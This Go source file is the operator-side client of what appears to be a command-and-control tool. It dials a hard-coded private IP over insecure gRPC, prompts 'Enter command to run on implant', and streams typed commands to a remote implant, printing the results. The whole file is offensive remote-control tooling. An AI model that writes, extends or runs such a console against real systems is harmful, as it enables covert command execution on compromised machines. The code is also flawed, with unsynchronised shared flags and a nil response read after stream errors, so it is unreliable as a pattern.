package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"

	pb "github.com/bartimus-primed/proto/forward/forward_pb"
	"google.golang.org/grpc"
)

const (
	address     = "192.168.253.1:50551"
	defaultName = "client0"
)

var recv bool = true
var shouldExit bool = false

// var wchan chan bool

func main() {
	conn, err := grpc.Dial(address, grpc.WithInsecure())
	if err != nil {
		log.Fatalf("did not connect: %v", err)
	}
	defer conn.Close()
	c := pb.NewInteractClient(conn)

	stream, err := c.HandsOn(context.Background())
	if err != nil {
		panic(err.Error())
	}
	command_buff := bufio.NewReader(os.Stdin)
	command_to_run := ""
	go func() {
		for {
			resp, err := stream.Recv()
			if err != nil || resp.Resp == "" {
				fmt.Println("Command Error...")
				recv = true
			}
			if resp.Resp != "" {
				fmt.Println("\nReceived: ", resp.GetResp())
				recv = true
				if strings.TrimSpace(resp.GetResp()) == "exit" {
					shouldExit = true
				}
			}
		}
	}()
	for !shouldExit {
		if recv {
			fmt.Print("Enter command to run on implant: ")
			recv = false
			cmd_input, _ := command_buff.ReadString('\n')
			command_to_run = strings.Replace(cmd_input, "\n", "", -1)
			command_to_run = strings.TrimSpace(command_to_run)
			if command_to_run == "exit" {
				shouldExit = true
			}
			fmt.Println(fmt.Sprintln(command_to_run))
			cmd := &pb.Command{
				Cmd:      fmt.Sprintln(command_to_run),
				Timeout:  5,
				SendResp: true,
			}
			stream.Send(cmd)
		}
	}
}
